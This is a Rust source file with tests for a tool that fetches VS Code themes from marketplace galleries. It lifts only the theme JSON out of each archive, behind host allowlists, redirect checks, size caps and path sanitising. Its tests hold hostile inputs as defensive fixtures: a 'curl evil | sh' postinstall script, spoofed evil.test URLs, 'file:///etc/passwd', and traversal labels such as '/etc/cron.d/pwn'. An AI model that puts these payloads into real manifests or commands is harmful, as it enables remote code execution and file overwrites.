//! Fetching a VS Code theme from the marketplace (#350).
//!
//! The converter next door reads a theme JSON the user already has. This is
//! the other half the issue asks for: given a marketplace URL or a
//! `publisher.name` id, download the `.vsix`, take the theme JSON out of it,
//! and hand that to the converter.
//!
//! # What this does NOT do
//!
//! **No extension code is fetched to be run, and none is kept.** A `.vsix`
//! is a zip that may contain JavaScript, native binaries and a manifest
//! telling an editor to execute them. croft extracts exactly one member —
//! a theme JSON named by the extension's own `contributes.themes` — into a
//! temporary directory, converts it, and discards the archive. Nothing is
//! installed into an extensions directory, nothing is executed, and no
//! `package.json` field other than the theme list is read.
//!
//! That is the whole trust argument, and it is why this is a narrow path
//! rather than an extension installer: the archive is treated as a hostile
//! container from which one known-shaped file is lifted.

use std::path::{Path, PathBuf};
use std::time::Duration;

use anyhow::{Context, Result, bail};

/// How long the download may take before it is abandoned.
pub const FETCH_TIMEOUT: Duration = Duration::from_secs(60);

/// Largest `.vsix` worth downloading. Theme extensions are tens of
/// kilobytes; sixty-four megabytes means the URL is not what it claimed.
pub const MAX_VSIX_BYTES: u64 = 64 * 1024 * 1024;

/// Largest member this will read into memory as text.
///
/// The shared archive reader's own `MEMBER_CAP` is 100 MB, which is right
/// for a user opening an archive they chose to look at and far too generous
/// for a file downloaded from the internet and parsed as JSON. The two files
/// read here are a `package.json` and a theme — the largest theme on the
/// marketplace is a few hundred kilobytes — so a member past this is not a
/// theme, whatever it claims, and it would otherwise be read into a `String`
/// entire before anything looked at it.
///
/// Smaller than `MAX_VSIX_BYTES` deliberately: a member cap above the cap on
/// the whole archive could never bind, and the point of this one is that it
/// binds well before the archive limit does.
pub const MAX_MEMBER_BYTES: u64 = 8 * 1024 * 1024;

/// Which gallery an extension came from.
///
/// Carried on the id rather than assumed, because the two galleries do not
/// hold the same extensions. The themes bundled with VS Code itself —
/// `vscode.theme-monokai`, `vscode.theme-solarized-light` and their
/// siblings, the ones a user is most likely to reach for — are on Open VSX
/// and answer **404** on the Microsoft gallery. Accepting an `open-vsx.org`
/// URL and then downloading from Microsoft, as this first did, turns those
/// into a download failure whose message names a URL the user never typed.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Gallery {
    /// `marketplace.visualstudio.com`, the Microsoft gallery.
    VisualStudio,
    /// `open-vsx.org`, the Eclipse Foundation's open registry.
    OpenVsx,
}

/// A marketplace extension's identity: `publisher.name` plus the gallery
/// that holds it.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct ExtensionId {
    pub publisher: String,
    pub name: String,
    pub gallery: Gallery,
}

impl ExtensionId {
    /// The gallery's direct download URL for the latest version, or `None`
    /// for a gallery that needs a version lookup first.
    ///
    /// Note what this does NOT do: it never echoes the input. The URL is
    /// rebuilt from `publisher` and `name`, both of which have passed
    /// `split_id`'s `[A-Za-z0-9_-]` filter, so nothing attacker-shaped can
    /// reach the fetch even if host parsing were looser than it is.
    pub fn vsix_url(&self) -> Option<String> {
        match self.gallery {
            Gallery::VisualStudio => Some(format!(
                "https://marketplace.visualstudio.com/_apis/public/gallery/publishers/{}/vsextensions/{}/latest/vspackage",
                self.publisher, self.name
            )),
            // Open VSX serves each version at its own path, so the download
            // URL is not derivable from the id alone.
            Gallery::OpenVsx => None,
        }
    }

    /// Open VSX's metadata endpoint, which names the download URL.
    pub fn metadata_url(&self) -> String {
        format!(
            "https://open-vsx.org/api/{}/{}/latest",
            self.publisher, self.name
        )
    }
}

/// Parse `publisher.name`, a marketplace item URL, or an
/// `vscode:extension/publisher.name` link into an id.
///
/// Deliberately strict about the host. A URL that merely *looks* like a
/// marketplace link but points elsewhere would otherwise make this a
/// general-purpose downloader pointed at an archive extractor, which is a
/// much larger thing to trust than "fetch a theme from the marketplace".
pub fn parse_ref(input: &str) -> Result<ExtensionId> {
    let raw = input.trim();
    if raw.is_empty() {
        bail!("empty extension reference");
    }
    // `vscode:extension/publisher.name`
    let (candidate, gallery) = if let Some(rest) = raw.strip_prefix("vscode:extension/") {
        (rest.to_string(), Gallery::VisualStudio)
    } else if raw.starts_with("http://") || raw.starts_with("https://") {
        item_name_from_url(raw)?
    } else {
        // A bare id names no gallery; the Microsoft one is the default.
        (raw.to_string(), Gallery::VisualStudio)
    };
    split_id(&candidate, gallery)
}

/// The `publisher.name` a marketplace URL names, and which gallery it is.
fn item_name_from_url(url: &str) -> Result<(String, Gallery)> {
    let rest = url
        .strip_prefix("https://")
        .or_else(|| url.strip_prefix("http://"))
        .unwrap_or(url);
    let (host, tail) = rest.split_once('/').unwrap_or((rest, ""));
    // Host allowlist, exact match: `marketplace.visualstudio.com` and the
    // Open VSX mirror are the two galleries this understands.
    let host = host.split_once('@').map(|(_, h)| h).unwrap_or(host);
    let host = host.split(':').next().unwrap_or(host);
    // Hostnames are case-insensitive, and both galleries are written with
    // capitals in their own docs, so matching the raw bytes would refuse a
    // URL the user pasted from the site itself.
    let host = host.to_ascii_lowercase();
    let gallery = match host.as_str() {
        "marketplace.visualstudio.com" => Gallery::VisualStudio,
        "open-vsx.org" => Gallery::OpenVsx,
        _ => bail!(
            "not a marketplace URL: {host} (expected marketplace.visualstudio.com or open-vsx.org)"
        ),
    };
    if let Some(q) = tail.split_once('?').map(|(_, q)| q) {
        for pair in q.split('&') {
            if let Some(v) = pair.strip_prefix("itemName=") {
                return Ok((v.to_string(), gallery));
            }
        }
    }
    // Open VSX uses a path shape: /extension/publisher/name. Both halves
    // are cut at the same delimiters — an asymmetry here would leave the
    // publisher carrying a `?` that only `split_id` then rejected.
    if let Some(rest) = tail.strip_prefix("extension/")
        && let Some((pubr, name)) = rest.split_once('/')
    {
        let cut = |s: &str| s.split(['/', '?', '#']).next().unwrap_or(s).to_string();
        return Ok((format!("{}.{}", cut(pubr), cut(name)), gallery));
    }
    bail!("marketplace URL carries no itemName= parameter");
}

fn split_id(candidate: &str, gallery: Gallery) -> Result<ExtensionId> {
    let candidate = candidate.split(['?', '#']).next().unwrap_or(candidate);
    let Some((publisher, name)) = candidate.split_once('.') else {
        bail!("expected publisher.name, got {candidate:?}");
    };
    let ok = |s: &str| {
        !s.is_empty()
            && s.chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
    };
    if !ok(publisher) || !ok(name) {
        bail!("expected publisher.name in [A-Za-z0-9_-], got {candidate:?}");
    }
    Ok(ExtensionId {
        publisher: publisher.to_string(),
        name: name.to_string(),
        gallery,
    })
}

/// A theme label reduced to a safe FILE STEM.
///
/// The label is free-form text from inside the archive — the one field on
/// `ContributedTheme` that no charset rule has touched, unlike the publisher
/// and name, which `split_id` restricts. Interpolating it into a path is a
/// write-anywhere primitive: `"../../x"` climbs out of the scratch directory,
/// and `Path::join` with an ABSOLUTE label discards the base entirely, so the
/// write lands exactly where the label says. `extract_member` guards the
/// archive read; this guards the write that follows it, which would otherwise
/// walk straight past that guard.
///
/// Same class as `split_id`'s: keep `[A-Za-z0-9_-]`, and let everything else
/// become a separator. That leaves a stem recognisably derived from the label
/// (so a marketplace import and a file import of the same theme still agree on
/// an id) while containing no separator, no `.` and no `..`. A label with
/// nothing to keep falls back to a constant rather than an empty name.
pub fn file_stem(label: &str) -> String {
    let mapped: String = label
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || c == '-' || c == '_' {
                c
            } else {
                '-'
            }
        })
        .collect();
    let trimmed = mapped.trim_matches('-');
    if trimmed.is_empty() {
        String::from("theme")
    } else {
        trimmed.to_string()
    }
}

/// One theme a `.vsix` contributes, as its `package.json` declares it.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct ContributedTheme {
    /// The label a user would recognise ("One Dark Pro").
    pub label: String,
    /// Archive-relative path to the theme JSON.
    pub path: String,
}

/// The themes a `package.json` contributes, in declaration order.
///
/// Only `contributes.themes` is read. Every other field — `main`,
/// `activationEvents`, `scripts` — is ignored by construction, because the
/// archive is never installed and nothing in it is executed.
/// Resolve VS Code's `%key%` localisation placeholders against an NLS
/// bundle.
///
/// Manifests may write a label as `%themeLabel%` and keep the real text in
/// `package.nls.json`; VS Code substitutes it before displaying anything.
/// Without this, the themes VS Code itself bundles import under the literal
/// label `%themeLabel%` and derive an id of `themelabel` — which is not a
/// theme name any user typed or would recognise.
///
/// An unresolvable key is left exactly as it is rather than blanked: showing
/// `%themeLabel%` is confusing, but showing nothing is worse.
fn resolve_nls(value: &str, nls: Option<&serde_json::Value>) -> String {
    let Some(key) = value.strip_prefix('%').and_then(|v| v.strip_suffix('%')) else {
        return value.to_string();
    };
    nls.and_then(|n| n.get(key))
        .and_then(|v| v.as_str())
        .unwrap_or(value)
        .to_string()
}

pub fn contributed_themes(
    package_json: &str,
    nls_json: Option<&str>,
) -> Result<Vec<ContributedTheme>> {
    let v: serde_json::Value =
        serde_json::from_str(package_json).context("package.json is not valid JSON")?;
    let Some(list) = v.pointer("/contributes/themes").and_then(|t| t.as_array()) else {
        bail!("this extension contributes no themes");
    };
    // A malformed bundle is not worth failing the import over: the labels
    // simply stay unresolved, which is what happens without one anyway.
    let nls: Option<serde_json::Value> = nls_json.and_then(|text| serde_json::from_str(text).ok());
    let mut out = Vec::new();
    for t in list {
        let Some(path) = t.get("path").and_then(|p| p.as_str()) else {
            continue;
        };
        let label = t
            .get("label")
            .and_then(|l| l.as_str())
            .or_else(|| t.get("id").and_then(|l| l.as_str()))
            .unwrap_or(path);
        out.push(ContributedTheme {
            // `./themes/x.json` is how most manifests spell it; the archive
            // member has no leading `./`.
            path: path.trim_start_matches("./").to_string(),
            label: resolve_nls(label, nls.as_ref()),
        });
    }
    if out.is_empty() {
        bail!("this extension contributes no themes");
    }
    Ok(out)
}

/// Pick the theme to convert: the one whose label matches `wanted`
/// case-insensitively, or the only one, or an error listing the choices.
///
/// An extension contributing several themes (Catppuccin ships four) must
/// not silently convert whichever happens to be first — the user would get
/// a theme they did not ask for and no indication why.
pub fn pick_theme<'a>(
    themes: &'a [ContributedTheme],
    wanted: Option<&str>,
) -> Result<&'a ContributedTheme> {
    if let Some(w) = wanted {
        return themes
            .iter()
            .find(|t| t.label.eq_ignore_ascii_case(w))
            .with_context(|| {
                let names: Vec<&str> = themes.iter().map(|t| t.label.as_str()).collect();
                format!(
                    "no theme called {w:?}; this extension has: {}",
                    names.join(", ")
                )
            });
    }
    match themes {
        [only] => Ok(only),
        many => {
            let names: Vec<&str> = many.iter().map(|t| t.label.as_str()).collect();
            bail!(
                "this extension contributes {} themes; pass --theme with one of: {}",
                many.len(),
                names.join(", ")
            )
        }
    }
}

/// Download the `.vsix` for `id` into `dir`, returning the file's path.
pub fn download_vsix(id: &ExtensionId, dir: &Path) -> Result<PathBuf> {
    use std::io::Read;
    let url = match id.vsix_url() {
        Some(url) => url,
        None => resolve_open_vsx_download(id)?,
    };
    let resp = get_checked(&url).with_context(|| format!("downloading {url}"))?;
    let dest = dir.join(format!("{}.{}.vsix", id.publisher, id.name));
    let mut bytes = Vec::new();
    resp.into_reader()
        .take(MAX_VSIX_BYTES + 1)
        .read_to_end(&mut bytes)
        .context("reading the .vsix body")?;
    if bytes.len() as u64 > MAX_VSIX_BYTES {
        bail!(
            "refusing a .vsix larger than {} bytes — that is not a theme",
            MAX_VSIX_BYTES
        );
    }
    let bytes = gunzip_if_needed(bytes)?;
    std::fs::write(&dest, &bytes).with_context(|| format!("writing {}", dest.display()))?;
    Ok(dest)
}

/// Hosts this module will fetch from.
///
/// The download hosts are NOT the same set as the two galleries a reference
/// may name: Open VSX answers its download URL with a 302 to its CDN
/// (`openvsx.eclipsecontent.org`), so refusing every redirect refuses every
/// Open VSX theme. Following redirects blindly is the other error — ureq
/// re-applies no host policy across a hop, so one open redirect at a gallery
/// would carry the fetch anywhere. Hence: follow hops by hand, and check each
/// one against this list.
const FETCH_HOSTS: [&str; 4] = [
    "marketplace.visualstudio.com",
    // The Microsoft gallery's own asset host, should it ever start using it.
    "gallery.vsassets.io",
    "open-vsx.org",
    // Open VSX's CDN, which its download URLs redirect to.
    "openvsx.eclipsecontent.org",
];

/// The host of an `https://` URL, lowercased.
fn host_of(url: &str) -> Option<String> {
    let rest = url.strip_prefix("https://")?;
    let host = rest.split('/').next()?;
    let host = host.split_once('@').map(|(_, h)| h).unwrap_or(host);
    let host = host.split(':').next().unwrap_or(host);
    (!host.is_empty()).then(|| host.to_ascii_lowercase())
}

/// Refuse a URL that is not on an allowed host, naming the host so the
/// failure is legible rather than a bare connection error.
fn check_host(url: &str) -> Result<()> {
    let Some(host) = host_of(url) else {
        bail!("not an https URL: {url}");
    };
    if !FETCH_HOSTS.contains(&host.as_str()) {
        bail!("refusing to fetch from {host} — not a marketplace host");
    }
    Ok(())
}

/// The agent every request here goes through: one timeout, and redirects
/// handled by the caller rather than by ureq.
fn agent() -> ureq::Agent {
    ureq::AgentBuilder::new()
        .timeout(FETCH_TIMEOUT)
        .redirects(0)
        .build()
}

/// How many hops a fetch may take before it is treated as a loop.
const MAX_HOPS: usize = 4;

/// GET `url`, following redirects ONE AT A TIME and re-checking the host at
/// every hop.
///
/// This is the module's trust boundary in its load-bearing form. The
/// allowlist on user input decides where a fetch may START; without this it
/// would say nothing about where the bytes finally come from, and a single
/// open redirect at either gallery would make the check decorative.
fn get_checked(url: &str) -> Result<ureq::Response> {
    let mut url = url.to_string();
    for _ in 0..MAX_HOPS {
        check_host(&url)?;
        let resp = agent()
            .get(&url)
            .call()
            .with_context(|| format!("fetching {url}"))?;
        if !(300..400).contains(&resp.status()) {
            return Ok(resp);
        }
        let Some(next) = resp.header("location") else {
            bail!("{url} answered {} with no location", resp.status());
        };
        // A relative location keeps the current host; an absolute one is
        // re-checked at the top of the next turn.
        url = match next.starts_with("https://") {
            true => next.to_string(),
            false => match host_of(&url) {
                Some(h) => format!("https://{h}{next}"),
                None => bail!("cannot resolve {next} against {url}"),
            },
        };
    }
    bail!("too many redirects fetching {url}")
}

/// Ask Open VSX where the latest `.vsix` lives.
///
/// Open VSX serves each version at its own path, so unlike the Microsoft
/// gallery there is no "latest" download URL to build from the id alone.
/// The answer names a URL, which means a URL from the network reaches the
/// fetch — so it is checked against the SAME host allowlist as user input
/// before it is used. A registry that started answering with a link
/// elsewhere would otherwise walk the download straight off the boundary
/// `parse_ref` exists to draw.
fn resolve_open_vsx_download(id: &ExtensionId) -> Result<String> {
    use std::io::Read;
    let meta_url = id.metadata_url();
    let resp = get_checked(&meta_url).with_context(|| format!("looking up {meta_url}"))?;
    let mut body = String::new();
    resp.into_reader()
        .take(MAX_MEMBER_BYTES + 1)
        .read_to_string(&mut body)
        .context("reading the Open VSX metadata")?;
    let doc: serde_json::Value =
        serde_json::from_str(&body).context("parsing the Open VSX metadata")?;
    let Some(url) = doc
        .get("files")
        .and_then(|f| f.get("download"))
        .and_then(|d| d.as_str())
    else {
        bail!(
            "Open VSX names no download for {}.{}",
            id.publisher,
            id.name
        );
    };
    // The URL came off the network, so it gets the same check as user input.
    check_host(url).with_context(|| format!("Open VSX named a download at {url}"))?;
    Ok(url.to_string())
}

/// The gallery serves the `.vsix` gzipped, and answers with the compressed
/// bytes unless the client negotiates otherwise — so what arrives is a
/// gzip stream wrapping a zip, and handing it straight to the zip reader
/// fails with "Could not find EOCD". Sniff the magic rather than trusting
/// a header: this is the one place the archive's shape is knowable for
/// certain, and a mislabelled response should still work.
fn gunzip_if_needed(bytes: Vec<u8>) -> Result<Vec<u8>> {
    use std::io::Read;
    if !bytes.starts_with(&[0x1f, 0x8b]) {
        return Ok(bytes);
    }
    let mut out = Vec::new();
    flate2::read::GzDecoder::new(&bytes[..])
        .take(MAX_VSIX_BYTES + 1)
        .read_to_end(&mut out)
        .context("decompressing the gzipped .vsix")?;
    if out.len() as u64 > MAX_VSIX_BYTES {
        bail!(
            "refusing a .vsix that decompresses past {} bytes",
            MAX_VSIX_BYTES
        );
    }
    Ok(out)
}

/// Read one member of the `.vsix` as text, through the shared archive
/// reader so the traversal guard and the size cap apply.
pub fn read_member(vsix: &Path, member: &str, scratch: &Path) -> Result<String> {
    let extracted =
        crate::archive::extract_member(vsix, crate::archive::ArchiveKind::Zip, member, scratch)
            .with_context(|| format!("extracting {member}"))?;
    // Check the size on disk BEFORE reading: `read_to_string` on a member
    // the shared cap allowed (100 MB) would allocate all of it first.
    let len = std::fs::metadata(&extracted)
        .with_context(|| format!("sizing {member}"))?
        .len();
    if len > MAX_MEMBER_BYTES {
        bail!("{member} is {len} bytes — that is not a theme file");
    }
    std::fs::read_to_string(&extracted).with_context(|| format!("reading {member}"))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn every_reference_shape_resolves_to_the_same_id() {
        let ms = ExtensionId {
            publisher: "zhuangtongfa".into(),
            name: "material-theme".into(),
            gallery: Gallery::VisualStudio,
        };
        for input in [
            "zhuangtongfa.material-theme",
            "vscode:extension/zhuangtongfa.material-theme",
            "https://marketplace.visualstudio.com/items?itemName=zhuangtongfa.material-theme",
            "https://marketplace.visualstudio.com/items?ssr=false&itemName=zhuangtongfa.material-theme",
            "  zhuangtongfa.material-theme  ",
            // Hostnames are case-insensitive; the site itself writes capitals.
            "https://Marketplace.VisualStudio.com/items?itemName=zhuangtongfa.material-theme",
        ] {
            assert_eq!(parse_ref(input).unwrap(), ms, "for {input}");
        }
        assert_eq!(
            ms.vsix_url().unwrap(),
            "https://marketplace.visualstudio.com/_apis/public/gallery/publishers/zhuangtongfa/vsextensions/material-theme/latest/vspackage"
        );
    }

    /// An Open VSX reference must not be downloaded from Microsoft.
    ///
    /// The two galleries hold different extensions — the themes bundled with
    /// VS Code are on Open VSX and 404 on the Microsoft gallery — so routing
    /// one to the other is a download failure naming a URL the user never
    /// typed. This is a regression pin: the id alone used to be the whole
    /// answer, which made the two references indistinguishable.
    #[test]
    fn an_open_vsx_reference_keeps_its_gallery() {
        let id = parse_ref("https://open-vsx.org/extension/vscode/theme-monokai").unwrap();
        assert_eq!(id.publisher, "vscode");
        assert_eq!(id.name, "theme-monokai");
        assert_eq!(id.gallery, Gallery::OpenVsx);
        // No derivable download URL, so nothing can point at the wrong host.
        assert!(id.vsix_url().is_none());
        assert!(id.metadata_url().starts_with("https://open-vsx.org/api/"));

        // The same id from the Microsoft gallery keeps ITS gallery.
        let ms = parse_ref("vscode.theme-monokai").unwrap();
        assert_eq!(ms.gallery, Gallery::VisualStudio);
        assert!(
            ms.vsix_url()
                .unwrap()
                .contains("marketplace.visualstudio.com")
        );
        assert_ne!(id, ms);
    }

    /// The theme LABEL is free text from inside a hostile archive, and it
    /// used to name the file the theme was written to. `Path::join` with an
    /// absolute label discards the base entirely, so the write landed
    /// exactly where the label said — walking straight past the archive
    /// guard that had just done its job correctly.
    #[test]
    fn a_hostile_theme_label_cannot_name_a_path() {
        let scratch = Path::new("/tmp/croft-scratch-fixture");
        for label in [
            "../../../../tmp/PWNED",
            "/etc/cron.d/pwn",
            "..",
            "../..",
            "a/b/c",
            "a\\b",
            "....//....//x",
        ] {
            let stem = file_stem(label);
            assert!(
                !stem.contains('/') && !stem.contains('\\'),
                "{label:?} kept a separator: {stem:?}"
            );
            assert!(stem != ".." && stem != ".", "{label:?} stayed traversal");
            let out = scratch.join(format!("{stem}.json"));
            assert!(
                out.starts_with(scratch),
                "{label:?} escaped the scratch dir: {}",
                out.display()
            );
        }
        // A label with nothing to keep still yields a usable name.
        assert_eq!(file_stem("///"), "theme");
        assert_eq!(file_stem(""), "theme");
        // And an ordinary label survives recognisably, so a marketplace
        // import and a file import of the same theme still agree on an id.
        assert_eq!(file_stem("Nord"), "Nord");
        assert_eq!(file_stem("One Dark Pro"), "One-Dark-Pro");
    }

    /// Every hop is checked, not just the first.
    ///
    /// The allowlist on user input decides where a fetch may START. Open VSX
    /// answers its download URL with a 302 to its CDN, so hops must be
    /// followed — and the moment they are, a single open redirect at either
    /// gallery would carry the fetch anywhere unless each hop is re-checked.
    #[test]
    fn only_marketplace_hosts_are_fetched_from() {
        for url in [
            "https://marketplace.visualstudio.com/_apis/x",
            "https://open-vsx.org/api/vscode/theme-monokai/latest",
            "https://openvsx.eclipsecontent.org/vscode/theme-monokai/1.0.0/x.vsix",
            // Case is not significant in a hostname.
            "https://Open-VSX.org/api/a/b/latest",
        ] {
            assert!(check_host(url).is_ok(), "must allow {url}");
        }
        for url in [
            "https://evil.test/x.vsix",
            // The shapes that defeat a naive prefix or suffix check.
            "https://open-vsx.org.evil.test/x.vsix",
            "https://evil.test/open-vsx.org/x.vsix",
            "https://open-vsx.org@evil.test/x.vsix",
            "https://openvsx.eclipsecontent.org.evil.test/x",
            // Not https at all.
            "http://open-vsx.org/x.vsix",
            "file:///etc/passwd",
            "",
        ] {
            assert!(check_host(url).is_err(), "must refuse {url}");
        }
        // Userinfo takes the host AFTER the `@`, which is the real host.
        assert_eq!(
            host_of("https://evil.test@open-vsx.org/x").as_deref(),
            Some("open-vsx.org")
        );
    }

    /// The host allowlist is the whole trust boundary: without it this is a
    /// general downloader wired to an archive extractor.
    #[test]
    fn a_url_that_is_not_a_marketplace_is_refused() {
        for input in [
            "https://evil.test/items?itemName=a.b",
            "https://marketplace.visualstudio.com.evil.test/items?itemName=a.b",
            "http://user@evil.test/items?itemName=a.b",
            "https://marketplace.visualstudio.com/items",
            "",
            "not-an-id",
            "a.",
            ".b",
            "a b.c",
            "../../etc/passwd",
            "a.b/../../c",
        ] {
            assert!(parse_ref(input).is_err(), "must refuse {input:?}");
        }
    }

    #[test]
    fn only_the_theme_list_is_read_from_a_package_json() {
        let pkg = r##"{
          "name": "x", "main": "./out/extension.js",
          "activationEvents": ["*"],
          "scripts": { "postinstall": "curl evil | sh" },
          "contributes": {
            "commands": [{ "command": "x.run" }],
            "themes": [
              { "label": "One Dark Pro", "uiTheme": "vs-dark", "path": "./themes/OneDark-Pro.json" },
              { "id": "flat", "uiTheme": "vs-dark", "path": "themes/flat.json" }
            ]
          }
        }"##;
        let themes = contributed_themes(pkg, None).unwrap();
        assert_eq!(
            themes,
            vec![
                ContributedTheme {
                    label: "One Dark Pro".into(),
                    path: "themes/OneDark-Pro.json".into()
                },
                ContributedTheme {
                    label: "flat".into(),
                    path: "themes/flat.json".into()
                },
            ],
            "the leading ./ is stripped and `id` stands in for a missing label"
        );
        // An extension with no themes is refused rather than half-handled.
        assert!(contributed_themes(r#"{"contributes":{"commands":[]}}"#, None).is_err());
        assert!(contributed_themes("not json", None).is_err());

        // A `%key%` label is VS Code's localisation placeholder, resolved
        // from `package.nls.json`. Unresolved, the themes VS Code itself
        // bundles import as the literal "%themeLabel%" and derive the id
        // "themelabel" — a name no user typed or would recognise.
        let nls_pkg =
            r#"{"contributes":{"themes":[{"label":"%themeLabel%","path":"./themes/m.json"}]}}"#;
        let bundle = r#"{"themeLabel":"Monokai","description":"unrelated"}"#;
        let resolved = contributed_themes(nls_pkg, Some(bundle)).unwrap();
        assert_eq!(resolved[0].label, "Monokai");
        // No bundle, or one lacking the key, leaves the label as written:
        // "%themeLabel%" is confusing, but an empty name is worse.
        assert_eq!(
            contributed_themes(nls_pkg, None).unwrap()[0].label,
            "%themeLabel%"
        );
        assert_eq!(
            contributed_themes(nls_pkg, Some(r#"{"other":"x"}"#)).unwrap()[0].label,
            "%themeLabel%"
        );
        // A malformed bundle must not fail the import.
        assert_eq!(
            contributed_themes(nls_pkg, Some("not json")).unwrap()[0].label,
            "%themeLabel%"
        );
        // A label that merely CONTAINS a percent sign is not a placeholder.
        let pct = r#"{"contributes":{"themes":[{"label":"100% Dark","path":"./t.json"}]}}"#;
        assert_eq!(
            contributed_themes(pct, Some(bundle)).unwrap()[0].label,
            "100% Dark"
        );
    }

    /// The gallery gzips the `.vsix`, so the bytes that arrive are a gzip
    /// stream wrapping a zip. Sniffed by magic, and a plain zip passes
    /// through untouched.
    #[test]
    fn a_gzipped_vsix_is_unwrapped_and_a_plain_one_is_not() {
        use std::io::Write;
        let zip_magic = b"PK\x03\x04rest of a zip";
        assert_eq!(
            gunzip_if_needed(zip_magic.to_vec()).unwrap(),
            zip_magic.to_vec(),
            "a plain zip is passed through byte for byte"
        );
        let mut enc = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
        enc.write_all(zip_magic).unwrap();
        let gzipped = enc.finish().unwrap();
        assert_eq!(&gzipped[..2], &[0x1f, 0x8b], "fixture really is gzip");
        assert_eq!(
            gunzip_if_needed(gzipped).unwrap(),
            zip_magic.to_vec(),
            "and a gzipped one is unwrapped to the same bytes"
        );
    }

    /// Several themes in one extension must not silently convert the first.
    #[test]
    fn a_multi_theme_extension_asks_which_one() {
        let themes = vec![
            ContributedTheme {
                label: "Catppuccin Mocha".into(),
                path: "themes/mocha.json".into(),
            },
            ContributedTheme {
                label: "Catppuccin Latte".into(),
                path: "themes/latte.json".into(),
            },
        ];
        let err = pick_theme(&themes, None).unwrap_err().to_string();
        assert!(
            err.contains("Catppuccin Mocha") && err.contains("Catppuccin Latte"),
            "{err}"
        );
        assert_eq!(
            pick_theme(&themes, Some("catppuccin latte")).unwrap().path,
            "themes/latte.json",
            "the match is case-insensitive"
        );
        let miss = pick_theme(&themes, Some("Nord")).unwrap_err().to_string();
        assert!(miss.contains("no theme called"), "{miss}");

        // A single-theme extension needs no choice.
        let one = &themes[..1];
        assert_eq!(pick_theme(one, None).unwrap().path, "themes/mocha.json");
    }
}
